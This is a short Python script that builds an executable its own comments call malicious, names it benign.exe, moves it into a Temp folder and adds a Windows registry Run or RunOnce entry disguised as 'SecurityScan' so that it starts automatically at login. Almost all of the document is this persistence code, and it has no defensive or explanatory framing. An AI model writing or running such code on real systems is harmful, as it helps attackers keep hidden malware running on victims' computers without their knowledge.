import os, shutil, winreg

filedir = os.path.join(os.getcwd(),"Temp")
filename = "benign.exe"
filepath = os.path.join(filedir,filename)

# Check if "__pycache__" exists and delete it if found
cache_dir = "__pycache__"
if os.path.exists(cache_dir):
    try:
        shutil.rmtree(cache_dir)
        print(f"{cache_dir} has been removed successfully.")
    except PermissionError:
        print(f"Permission denied: Unable to delete {cache_dir}. Try running as administrator.")
    except Exception as e:
        print(f"An error occurred: {e}")
else:
    print(f"{cache_dir} does not exist.")

if os.path.isfile(filepath):
    os.remove(filepath)

# Use BuildExe to create malicious executable
os.system("python BuildExe.py")

# Move malicious executable to desired directory
shutil.move(filename,filedir)


# Windows default autorun keys:
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce

regkey = 1

if regkey < 2:
    reghive = winreg.HKEY_CURRENT_USER
else:
    reghive = winreg.HKEY_LOCAL_MACHINE
if (regkey % 2) == 0:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
else:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"


# Add registry autorun key
reg = winreg.ConnectRegistry(None,reghive)
key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key,"SecurityScan",0,winreg.REG_SZ,filepath)